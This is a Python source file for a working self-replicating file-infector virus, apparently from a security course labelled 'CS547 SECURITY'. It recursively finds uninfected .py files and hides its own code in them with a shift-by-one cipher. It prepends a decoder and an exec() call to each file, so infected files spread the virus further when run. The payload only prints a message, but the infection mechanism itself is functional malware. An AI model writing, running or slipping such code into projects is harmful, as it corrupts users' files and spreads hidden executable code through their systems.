import os
import random
code = ''
def encrypt(str_code):
    enc_str = ""
    for c in str_code:
        enc_str = enc_str+ chr(ord(c) + 1)
    return enc_str
num_lines= 61
def search(path):
    filestoinfect=[]
    filelist=os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:]==".py":
            infected = False
            for line in open(path+"/"+fname):
                if 'SIGNATURE = "CS547 SECURITY"' in line:
                    infected= True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect    
def infect(filestoinfect):
    virus = open('virus.py')
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i< num_lines:
            virusstring+= line
    virus.close()
    virusstring = encrypt(virusstring)
    for fname in filestoinfect:
        f=open(fname)
        temp=f.read()
        f.close()
        f=open(fname,"w")
        print('SIGNATURE = "CS547 SECURITY"',file=f)
        print('code = \"\"\"',file=f,end='')
        print(virusstring,file=f)
        print('\"\"\"',file=f)
        print('def decrypt(enc_code):',file=f)
        print('\tdec_str=\'\'',file=f)
        print('\tfor c in enc_code:',file=f)
        print('\t\tdec_str = dec_str+chr(ord(c) - 1)',file=f)
        print('\treturn dec_str',file=f)
        print('exec(decrypt(code))',file=f)
        print(temp,file=f)  
        f.close()
def payload():
    if random.randint(1,4) == 4 :
        print("VIRUS ACTION")

filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
payload()